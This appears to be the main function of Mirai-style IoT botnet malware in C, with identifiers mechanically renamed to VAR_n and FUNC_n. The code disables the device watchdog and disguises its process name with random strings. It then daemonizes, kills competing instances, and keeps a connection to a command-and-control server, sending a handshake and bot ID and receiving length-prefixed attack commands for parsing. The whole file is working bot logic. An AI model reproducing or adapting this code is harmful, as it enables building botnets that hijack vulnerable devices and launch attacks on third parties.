
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_4__ TYPE_2__ ;
typedef struct TYPE_3__ TYPE_1__ ;


typedef char uint8_t ;
typedef int uint16_t ;
struct timeval {int tv_sec; scalar_t__ tv_usec; } ;
struct sockaddr_in {int dummy; } ;
struct sockaddr {int dummy; } ;
struct sigaction {void* sa_sigaction; int sa_mask; void* sa_flags; } ;
typedef int socklen_t ;
typedef int sigset_t ;
typedef int rdbuf ;
typedef int len ;
typedef int id_len ;
typedef int fd_set ;
typedef int err ;
typedef int cli_addr ;
struct TYPE_3__ {int s_addr; } ;
struct TYPE_4__ {int sin_port; TYPE_1__ sin_addr; int sin_family; } ;


 int VAR_0 ;
 int VAR_1 ;
 int VAR_2 ;
 int VAR_3 ;
 int VAR_4 ;
 int VAR_5 ;
 scalar_t__ VAR_6 ;
 scalar_t__ FUNC_0 (int,int *) ;
 int FUNC_1 (int,int *) ;
 int FUNC_2 (int *) ;
 int VAR_7 ;
 int VAR_8 ;
 int VAR_9 ;
 int VAR_10 ;
 void* VAR_11 ;
 int VAR_12 ;
 int VAR_13 ;
 int VAR_14 ;
 int VAR_15 ;
 int VAR_16 ;
 int VAR_17 ;
 int FUNC_3 (int ) ;
 int VAR_18 ;
 int VAR_19 ;
 int VAR_20 ;
 int VAR_21 ;
 int VAR_22 ;
 int VAR_23 ;
 scalar_t__ VAR_24 ;
 int FUNC_4 (int,struct sockaddr*,int*) ;
 int FUNC_5 (int ) ;
 int FUNC_6 () ;
 int FUNC_7 () ;
 int FUNC_8 (char*,int) ;
 int FUNC_9 (char*) ;
 int FUNC_10 (int) ;
 int FUNC_11 () ;
 int VAR_25 ;
 int FUNC_12 () ;
 int FUNC_13 (int ) ;
 int VAR_26 ;
 int VAR_27 ;
 scalar_t__ FUNC_14 () ;
 int FUNC_15 (int,int ,int ,int*,int*) ;
 int FUNC_16 (int ) ;
 int FUNC_17 (int,int,int*) ;
 int FUNC_18 (int,int) ;
 int FUNC_19 () ;
 int FUNC_20 () ;
 int FUNC_21 (int) ;
 int FUNC_22 (char*,int) ;
 scalar_t__ VAR_28 ;
 int FUNC_23 (char*) ;
 int FUNC_24 (int ,char*) ;
 int FUNC_25 (char*,...) ;
 int FUNC_26 (int ) ;
 int FUNC_27 (char*,int) ;
 int FUNC_28 () ;
 int FUNC_29 () ;
 int FUNC_30 (int,...) ;
 int FUNC_31 () ;
 int FUNC_32 () ;
 void* VAR_29 ;
 int FUNC_33 (int,int *,int *,int *,struct timeval*) ;
 int FUNC_34 (int,...) ;
 int FUNC_35 () ;
 int FUNC_36 (int ,struct sigaction*,int *) ;
 int FUNC_37 (int *,int ) ;
 int FUNC_38 (int *) ;
 int FUNC_39 (int ,int (*) (int )) ;
 int FUNC_40 (int ,int *,int *) ;
 int FUNC_41 (int) ;
 TYPE_2__ VAR_30 ;
 int FUNC_42 (int ) ;
 char* FUNC_43 (int ,int*) ;
 int FUNC_44 (int ) ;
 int FUNC_45 () ;
 int FUNC_46 (char*) ;
 scalar_t__ FUNC_47 (char*) ;
 int FUNC_48 () ;
 int FUNC_49 (char*,char*) ;
 int FUNC_50 (char*) ;
 int FUNC_51 (char*,int) ;
 int FUNC_52 (int,char*,int) ;

int FUNC_53(int VAR_31, char **VAR_32)
{
    char *VAR_33;
    char VAR_34[32];
    char VAR_35[32];
    int VAR_36;
    int VAR_37;
    int VAR_38, VAR_39 = 0;


    sigset_t VAR_40;
    int VAR_41;


    FUNC_46(VAR_32[0]);


    FUNC_38(&VAR_40);
    FUNC_37(&VAR_40, VAR_14);
    FUNC_40(VAR_17, &VAR_40, ((void*)0));
    FUNC_39(VAR_13, FUNC_3);
    FUNC_39(VAR_16, &FUNC_5);


    if ((VAR_41 = FUNC_22("/dev/watchdog", 2)) != -1 ||
        (VAR_41 = FUNC_22("/dev/misc/watchdog", 2)) != -1)
    {
        int VAR_42 = 1;

        FUNC_17(VAR_41, 0x80045704, &VAR_42);
        FUNC_10(VAR_41);
        VAR_41 = 0;
    }
    FUNC_9("/");
    VAR_7 = FUNC_48();

    VAR_30.sin_family = VAR_0;
    VAR_30.sin_addr.s_addr = VAR_4;
    VAR_30.sin_port = FUNC_16(VAR_5);





    if (FUNC_47(VAR_32[0]))
        FUNC_26(VAR_16);


    FUNC_11();

    FUNC_28();

    FUNC_51(VAR_35, 32);
    if (VAR_31 == 2 && FUNC_50(VAR_32[1]) < 32)
    {
        FUNC_49(VAR_35, VAR_32[1]);
        FUNC_51(VAR_32[1], FUNC_50(VAR_32[1]));
    }


    VAR_36 = ((FUNC_29() % 4) + 3) * 4;
    FUNC_27(VAR_34, VAR_36);
    VAR_34[VAR_36] = 0;
    FUNC_49(VAR_32[0], VAR_34);


    VAR_36 = ((FUNC_29() % 6) + 3) * 4;
    FUNC_27(VAR_34, VAR_36);
    VAR_34[VAR_36] = 0;
    FUNC_24(VAR_10, VAR_34);


    FUNC_44(VAR_23);
    VAR_33 = FUNC_43(VAR_23, &VAR_37);
    FUNC_52(VAR_22, VAR_33, VAR_37);
    FUNC_52(VAR_22, "\n", 1);
    FUNC_42(VAR_23);


    if (FUNC_14() > 0)
        return 0;
    VAR_38 = FUNC_35();
    FUNC_10(VAR_21);
    FUNC_10(VAR_22);
    FUNC_10(VAR_20);


    FUNC_6();
    FUNC_19();






    while (VAR_24)
    {
        fd_set VAR_43, VAR_44, VAR_45;
        struct timeval VAR_46;
        int VAR_47, VAR_48;

        FUNC_2(&VAR_43);
        FUNC_2(&VAR_44);


        if (VAR_26 != -1)
            FUNC_1(VAR_26, &VAR_43);


        if (VAR_27 == -1)
            FUNC_12();

        if (VAR_28)
            FUNC_1(VAR_27, &VAR_44);
        else
            FUNC_1(VAR_27, &VAR_43);


        if (VAR_26 > VAR_27)
            VAR_47 = VAR_26;
        else
            VAR_47 = VAR_27;


        VAR_46.tv_usec = 0;
        VAR_46.tv_sec = 10;
        VAR_48 = FUNC_33(VAR_47 + 1, &VAR_43, &VAR_44, ((void*)0), &VAR_46);
        if (VAR_48 == -1)
        {



            continue;
        }
        else if (VAR_48 == 0)
        {
            uint16_t VAR_49 = 0;

            if (VAR_39++ % 6 == 0)
                FUNC_34(VAR_27, &VAR_49, sizeof (VAR_49), VAR_8);
        }


        if (VAR_26 != -1 && FUNC_0(VAR_26, &VAR_43))
        {
            struct sockaddr_in VAR_50;
            socklen_t VAR_51 = sizeof (VAR_50);

            FUNC_4(VAR_26, (struct sockaddr *)&VAR_50, &VAR_51);







            FUNC_20();
            FUNC_7();
            FUNC_18(VAR_38 * -1, 9);
            FUNC_13(0);
        }


        if (VAR_28)
        {
            VAR_28 = VAR_6;

            if (!FUNC_0(VAR_27, &VAR_44))
            {



                FUNC_45();
            }
            else
            {
                int VAR_52 = 0;
                socklen_t VAR_53 = sizeof (VAR_52);

                FUNC_15(VAR_27, VAR_18, VAR_19, &VAR_52, &VAR_53);
                if (VAR_52 != 0)
                {



                    FUNC_10(VAR_27);
                    VAR_27 = -1;
                    FUNC_41((FUNC_29() % 10) + 1);
                }
                else
                {
                    uint8_t VAR_54 = FUNC_50(VAR_35);

                    VAR_7 = FUNC_48();
                    FUNC_34(VAR_27, "\x00\x00\x00\x01", 4, VAR_8);
                    FUNC_34(VAR_27, &VAR_54, sizeof (VAR_54), VAR_8);
                    if (VAR_54 > 0)
                    {
                        FUNC_34(VAR_27, VAR_35, VAR_54, VAR_8);
                    }



                }
            }
        }
        else if (VAR_27 != -1 && FUNC_0(VAR_27, &VAR_43))
        {
            int VAR_55;
            uint16_t VAR_56;
            char VAR_57[1024];


            VAR_25 = 0;
            VAR_55 = FUNC_30(VAR_27, &VAR_56, sizeof (VAR_56), VAR_8 | VAR_9);
            if (VAR_55 == -1)
            {
                if (VAR_25 == VAR_3 || VAR_25 == VAR_1 || VAR_25 == VAR_2)
                    continue;
                else
                    VAR_55 = 0;
            }


            if (VAR_55 == 0)
            {



                FUNC_45();
                continue;
            }


            if (VAR_56 == 0)
            {
                FUNC_30(VAR_27, &VAR_56, sizeof (VAR_56), VAR_8);
                continue;
            }
            VAR_56 = FUNC_21(VAR_56);
            if (VAR_56 > sizeof (VAR_57))
            {
                FUNC_10(VAR_27);
                VAR_27 = -1;
            }


            VAR_25 = 0;
            VAR_55 = FUNC_30(VAR_27, VAR_57, VAR_56, VAR_8 | VAR_9);
            if (VAR_55 == -1)
            {
                if (VAR_25 == VAR_3 || VAR_25 == VAR_1 || VAR_25 == VAR_2)
                    continue;
                else
                    VAR_55 = 0;
            }


            if (VAR_55 == 0)
            {



                FUNC_45();
                continue;
            }


            FUNC_30(VAR_27, &VAR_56, sizeof (VAR_56), VAR_8);
            VAR_56 = FUNC_21(VAR_56);
            FUNC_30(VAR_27, VAR_57, VAR_56, VAR_8);





            if (VAR_56 > 0)
                FUNC_8(VAR_57, VAR_56);
        }
    }

    return 0;
}
